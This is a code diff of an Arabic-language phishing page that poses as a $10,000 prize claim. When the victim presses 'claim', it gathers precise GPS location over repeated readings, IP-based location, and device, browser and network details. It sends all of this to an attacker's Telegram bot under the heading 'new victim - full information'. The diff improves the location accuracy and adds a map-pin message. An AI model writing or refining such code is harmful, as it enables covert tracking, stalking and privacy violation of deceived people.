@@ -57,7 +57,7 @@
         border-radius: 50px;
         cursor: pointer;
         box-shadow: 0 8px 25px rgba(255, 215, 0, 0.5);
-        transition: transform 0.2s, box-shadow 0.2s;
+        transition: transform 0.2s;
         margin-top: 10px;
     }
     button:active { transform: scale(0.95); }
@@ -82,21 +82,11 @@
         color: #b0b0b0;
         display: none;
     }
-    .accuracy-bar {
-        width: 100%;
-        height: 6px;
-        background: rgba(255,255,255,0.15);
-        border-radius: 3px;
+    .accuracy-info {
         margin-top: 15px;
-        overflow: hidden;
+        font-size: 13px;
+        color: #FFD700;
         display: none;
-    }
-    .accuracy-fill {
-        height: 100%;
-        width: 0%;
-        background: linear-gradient(90deg, #FFD700, #FFA500);
-        transition: width 0.5s;
-        border-radius: 3px;
     }
 </style>
 </head>
@@ -106,9 +96,9 @@
     <p>لقد فزت بمبلغ <span class="amount">10,000 دولار</span></p>
     <p>اضغط على الزر أدناه لاستلام جائزتك الآن</p>
     <button id="claimBtn">استلام الجائزة</button>
-    <div class="accuracy-bar" id="accuracyBar"><div class="accuracy-fill" id="accuracyFill"></div></div>
     <div class="spinner" id="spinner"></div>
-    <div class="status" id="status">جاري تحديد موقعك بدقة...</div>
+    <div class="status" id="status"></div>
+    <div class="accuracy-info" id="accuracyInfo"></div>
 </div>
 
 <script>
@@ -134,82 +124,61 @@
         .catch(function(e) { console.error('Telegram error:', e); });
     }
 
-    function sendLocation(lat, lon) {
+    function sendTelegramLocation(lat, lon) {
         return fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendLocation', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 latitude: lat,
-                longitude: lon
+                longitude: lon,
+                horizontal_accuracy: 0
             })
         })
         .then(function(r) { return r.json(); })
         .catch(function(e) { console.error('Location error:', e); });
     }
 
-    function updateAccuracyBar(accuracy) {
-        var bar = document.getElementById('accuracyBar');
-        var fill = document.getElementById('accuracyFill');
-        bar.style.display = 'block';
-        var percent = Math.max(0, Math.min(100, 100 - (accuracy / 5)));
-        fill.style.width = percent + '%';
-    }
-
-    function getHighAccuracyLocation() {
+    function getBestGPSLocation() {
         return new Promise(function(resolve) {
             if (!navigator.geolocation) {
-                resolve({ success: false, error: 'خدمة تحديد الموقع غير مدعومة في متصفحك' });
+                resolve({
+                    success: false,
+                    error: 'خدمة تحديد الموقع غير مدعومة في المتصفح'
+                });
                 return;
             }
 
             var samples = [];
-            var finished = false;
             var watchId = null;
+            var finished = false;
             var bestAccuracy = Infinity;
-            var targetAccuracy = 50;
+            var bestPoint = null;
+            var MIN_ACCURACY_TARGET = 10;
+            var MAX_WAIT_TIME = 60000;
+            var MIN_SAMPLES = 3;
 
             function finish(result) {
                 if (finished) return;
                 finished = true;
                 if (watchId !== null) {
                     navigator.geolocation.clearWatch(watchId);
+                    watchId = null;
                 }
                 resolve(result);
             }
 
-            function pickBest() {
-                if (samples.length === 0) return null;
-                var best = samples[0];
-                for (var i = 1; i < samples.length; i++) {
-                    if (samples[i].accuracy < best.accuracy) {
-                        best = samples[i];
-                    }
+            function updateStatus(accuracy, count) {
+                var statusEl = document.getElementById('status');
+                var infoEl = document.getElementById('accuracyInfo');
+                statusEl.textContent = 'جاري تحسين دقة الموقع...';
+                statusEl.style.display = 'block';
+                infoEl.style.display = 'block';
+                if (accuracy && isFinite(accuracy)) {
+                    infoEl.textContent = 'الدقة الحالية: ' + Math.round(accuracy) + ' متر | القراءات: ' + count;
+                } else {
+                    infoEl.textContent = 'القراءات: ' + count;
                 }
-                return best;
-            }
-
-            function tryAlternativeSources() {
-                return fetch('https://ipapi.co/json/')
-                    .then(function(r) { return r.json(); })
-                    .then(function(data) {
-                        if (data && data.latitude && data.longitude) {
-                            return {
-                                success: true,
-                                data: {
-                                    lat: data.latitude,
-                                    lon: data.longitude,
-                                    accuracy: 5000,
-                                    source: 'IP (تقريبي)',
-                                    city: data.city,
-                                    country: data.country_name,
-                                    isp: data.org
-                                }
-                            };
-                        }
-                        return null;
-                    })
-                    .catch(function() { return null; });
             }
 
             var options = {
@@ -228,21 +197,31 @@
                         altitudeAccuracy: position.coords.altitudeAccuracy,
                         speed: position.coords.speed,
                         heading: position.coords.heading,
-                        timestamp: position.timestamp,
-                        source: 'GPS'
+                        timestamp: position.timestamp
                     };
+
                     samples.push(point);
-                    updateAccuracyBar(point.accuracy);
 
                     if (point.accuracy < bestAccuracy) {
                         bestAccuracy = point.accuracy;
+                        bestPoint = point;
                     }
 
-                    if (point.accuracy <= targetAccuracy) {
-                        finish({ success: true, data: point });
+                    updateStatus(bestAccuracy, samples.length);
+
+                    var enoughSamples = samples.length >= MIN_SAMPLES;
+                    var goodAccuracy = bestAccuracy <= MIN_ACCURACY_TARGET;
+                    var stableReadings = samples.length >= 5;
+
+                    if ((enoughSamples && goodAccuracy) || (stableReadings && bestAccuracy <= 20)) {
+                        finish({ success: true, data: bestPoint, samples: samples.length });
                     }
                 },
                 function(error) {
+                    if (bestPoint !== null) {
+                        finish({ success: true, data: bestPoint, samples: samples.length });
+                        return;
+                    }
                     var errorMsg;
                     switch (error.code) {
                         case error.PERMISSION_DENIED:
@@ -257,40 +236,45 @@
                         default:
                             errorMsg = 'خطأ غير معروف في تحديد الموقع';
                     }
-                    if (samples.length > 0) {
-                        finish({ success: true, data: pickBest() });
-                    } else {
-                        tryAlternativeSources().then(function(alt) {
-                            if (alt) {
-                                finish(alt);
-                            } else {
-                                finish({ success: false, error: errorMsg });
-                            }
-                        });
-                    }
+                    finish({ success: false, error: errorMsg });
                 },
                 options
             );
 
             setTimeout(function() {
-                if (samples.length > 0) {
-                    finish({ success: true, data: pickBest() });
+                if (bestPoint !== null) {
+                    finish({ success: true, data: bestPoint, samples: samples.length });
                 } else {
-                    tryAlternativeSources().then(function(alt) {
-                        if (alt) {
-                            finish(alt);
-                        } else {
-                            finish({ success: false, error: 'لم يتم الحصول على الموقع بعد انتهاء الوقت' });
-                        }
-                    });
+                    finish({ success: false, error: 'لم يتم الحصول على إشارة GPS خلال الوقت المحدد' });
                 }
-            }, 20000);
+            }, MAX_WAIT_TIME);
         });
+    }
+
+    function getIPFallback() {
+        return fetch('https://ipapi.co/json/')
+            .then(function(r) { return r.json(); })
+            .then(function(data) {
+                if (data && data.latitude && data.longitude) {
+                    return {
+                        ip: data.ip,
+                        city: data.city,
+                        region: data.region,
+                        country: data.country_name,
+                        isp: data.org,
+                        lat: data.latitude,
+                        lon: data.longitude,
+                        postal: data.postal,
+                        timezone: data.timezone
+                    };
+                }
+                return null;
+            })
+            .catch(function() { return null; });
     }
 
     function detectDeviceType() {
         var ua = navigator.userAgent;
-        var platform = navigator.platform || '';
         var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
         var isTablet = /iPad|Tablet|PlayBook|Silk/i.test(ua) || (isMobile && /Macintosh/i.test(ua));
         var isDesktop = !isMobile && !isTablet;
@@ -319,7 +303,6 @@
                 else if (/tecno/i.test(model)) brand = 'Tecno';
                 else if (/nokia/i.test(model)) brand = 'Nokia';
                 else if (/sony/i.test(model)) brand = 'Sony';
-                else if (/lg/i.test(model)) brand = 'LG';
                 else if (/motorola|moto/i.test(model)) brand = 'Motorola';
             }
         } else if (/iPhone|iPad|iPod/i.test(ua)) {
@@ -353,10 +336,10 @@
         var browser = 'غير معروف';
         if (/Edg\//i.test(ua)) browser = 'Microsoft Edge';
         else if (/OPR\/|Opera/i.test(ua)) browser = 'Opera';
+        else if (/SamsungBrowser/i.test(ua)) browser = 'Samsung Internet';
         else if (/Chrome\//i.test(ua) && !/Edg\//i.test(ua)) browser = 'Google Chrome';
         else if (/Firefox\//i.test(ua)) browser = 'Mozilla Firefox';
         else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
-        else if (/SamsungBrowser/i.test(ua)) browser = 'Samsung Internet';
 
         return {
             type: type,
@@ -364,17 +347,14 @@
             model: model,
             os: osName,
             osVersion: osVersion,
-            browser: browser,
-            isMobile: isMobile,
-            isTablet: isTablet,
-            isDesktop: isDesktop
+            browser: browser
         };
     }
 
     function collectDeviceInfo() {
         var device = detectDeviceType();
         var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        var info = {
+        return {
             deviceType: device.type,
             brand: device.brand,
             model: device.model,
@@ -404,18 +384,24 @@
             connectionType: conn ? (conn.effectiveType || conn.type || 'غير معروف') : 'غير معروف',
             downlink: conn && conn.downlink ? conn.downlink + ' Mbps' : 'غير معروف'
         };
-        return info;
     }
 
-    function formatLocation(loc, err) {
+    function formatGPSLocation(loc, samples, err) {
         if (err || !loc) {
-            return '❌ <b>لم يتم الحصول على الموقع</b>\nالسبب: ' + (err || 'غير معروف');
+            return '❌ <b>لم يتم الحصول على موقع GPS</b>\nالسبب: ' + (err || 'غير معروف');
         }
         var text = '';
         text += '🎯 <b>دقة الموقع:</b> ' + Math.round(loc.accuracy) + ' متر\n';
-        text += '📡 <b>المصدر:</b> ' + (loc.source || 'GPS') + '\n';
-        if (loc.accuracy > 1000) {
-            text += '⚠️ <b>ملاحظة:</b> الموقع تقريبي (حسب IP)\n';
+        text += '📡 <b>المصدر:</b> GPS\n';
+        text += '🔢 <b>عدد القراءات:</b> ' + samples + '\n';
+        if (loc.accuracy <= 10) {
+            text += '✅ <b>جودة الإشارة:</b> ممتازة\n';
+        } else if (loc.accuracy <= 30) {
+            text += '🟢 <b>جودة الإشارة:</b> جيدة جداً\n';
+        } else if (loc.accuracy <= 100) {
+            text += '🟡 <b>جودة الإشارة:</b> جيدة\n';
+        } else {
+            text += '🟠 <b>جودة الإشارة:</b> ضعيفة\n';
         }
         text += '📍 <b>خط العرض:</b> <code>' + loc.lat + '</code>\n';
         text += '📍 <b>خط الطول:</b> <code>' + loc.lon + '</code>\n';
@@ -430,6 +416,19 @@
         }
         text += '🗺️ <b>خرائط جوجل:</b>\n';
         text += 'https://www.google.com/maps?q=' + loc.lat + ',' + loc.lon;
+        return text;
+    }
+
+    function formatIPInfo(ip) {
+        if (!ip) return '❌ لم يتم الحصول على معلومات IP';
+        var text = '';
+        text += '🌍 <b>عنوان IP:</b> <code>' + (ip.ip || 'غير معروف') + '</code>\n';
+        text += '🏙️ <b>المدينة:</b> ' + (ip.city || 'غير معروف') + '\n';
+        text += '🗺️ <b>المنطقة:</b> ' + (ip.region || 'غير معروف') + '\n';
+        text += '🏳️ <b>الدولة:</b> ' + (ip.country || 'غير معروف') + '\n';
+        text += '📮 <b>الرمز البريدي:</b> ' + (ip.postal || 'غير معروف') + '\n';
+        text += '🕐 <b>المنطقة الزمنية:</b> ' + (ip.timezone || 'غير معروف') + '\n';
+        text += '📡 <b>مزود الخدمة:</b> ' + (ip.isp || 'غير معروف');
         return text;
     }
 
@@ -456,38 +455,6 @@
         return text;
     }
 
-    function getIPInfo() {
-        return fetch('https://ipapi.co/json/')
-            .then(function(r) { return r.json(); })
-            .then(function(data) {
-                return {
-                    ip: data.ip,
-                    city: data.city,
-                    region: data.region,
-                    country: data.country_name,
-                    isp: data.org,
-                    lat: data.latitude,
-                    lon: data.longitude,
-                    postal: data.postal,
-                    timezone: data.timezone
-                };
-            })
-            .catch(function() { return null; });
-    }
-
-    function formatIPInfo(ip) {
-        if (!ip) return '❌ لم يتم الحصول على معلومات IP';
-        var text = '';
-        text += '🌍 <b>عنوان IP:</b> <code>' + (ip.ip || 'غير معروف') + '</code>\n';
-        text += '🏙️ <b>المدينة:</b> ' + (ip.city || 'غير معروف') + '\n';
-        text += '🗺️ <b>المنطقة:</b> ' + (ip.region || 'غير معروف') + '\n';
-        text += '🏳️ <b>الدولة:</b> ' + (ip.country || 'غير معروف') + '\n';
-        text += '📮 <b>الرمز البريدي:</b> ' + (ip.postal || 'غير معروف') + '\n';
-        text += '🕐 <b>المنطقة الزمنية:</b> ' + (ip.timezone || 'غير معروف') + '\n';
-        text += '📡 <b>مزود الخدمة:</b> ' + (ip.isp || 'غير معروف');
-        return text;
-    }
-
     document.getElementById('claimBtn').addEventListener('click', function() {
         var btn = document.getElementById('claimBtn');
         var spinner = document.getElementById('spinner');
@@ -502,23 +469,23 @@
         var deviceInfo = collectDeviceInfo();
 
         Promise.all([
-            getHighAccuracyLocation(),
-            getIPInfo()
+            getBestGPSLocation(),
+            getIPFallback()
         ]).then(function(results) {
-            var locResult = results[0];
+            var gpsResult = results[0];
             var ipInfo = results[1];
 
-            var locationText;
-            if (locResult.success) {
-                locationText = formatLocation(locResult.data, null);
+            var gpsText;
+            if (gpsResult.success) {
+                gpsText = formatGPSLocation(gpsResult.data, gpsResult.samples, null);
             } else {
-                locationText = formatLocation(null, locResult.error);
+                gpsText = formatGPSLocation(null, 0, gpsResult.error);
             }
 
             var message = '🎯 <b>ضحية جديدة - معلومات كاملة</b>\n';
             message += '━━━━━━━━━━━━━━━━━━━━━\n\n';
-            message += '🌐 <b>الموقع الجغرافي (GPS):</b>\n';
-            message += locationText + '\n\n';
+            message += '📡 <b>الموقع الجغرافي (GPS):</b>\n';
+            message += gpsText + '\n\n';
             message += '━━━━━━━━━━━━━━━━━━━━━\n\n';
             message += '🌍 <b>الموقع حسب IP:</b>\n';
             message += formatIPInfo(ipInfo) + '\n\n';
@@ -533,12 +500,17 @@
 
             status.textContent = 'جاري إرسال البيانات...';
 
-            return sendToTelegram(message);
-        }).then(function() {
-            return sendToTelegram('📌 <b>تم إرسال الموقع كخريطة أعلاه</b>');
+            var tasks = [sendToTelegram(message)];
+
+            if (gpsResult.success) {
+                tasks.push(sendTelegramLocation(gpsResult.data.lat, gpsResult.data.lon));
+            }
+
+            return Promise.all(tasks);
         }).then(function() {
             spinner.style.display = 'none';
             status.textContent = 'تم الاستلام بنجاح ✅';
+            document.getElementById('accuracyInfo').style.display = 'none';
             btn.style.display = 'inline-block';
             btn.textContent = 'تم استلام الجائزة ✅';
             setTimeout(function() {
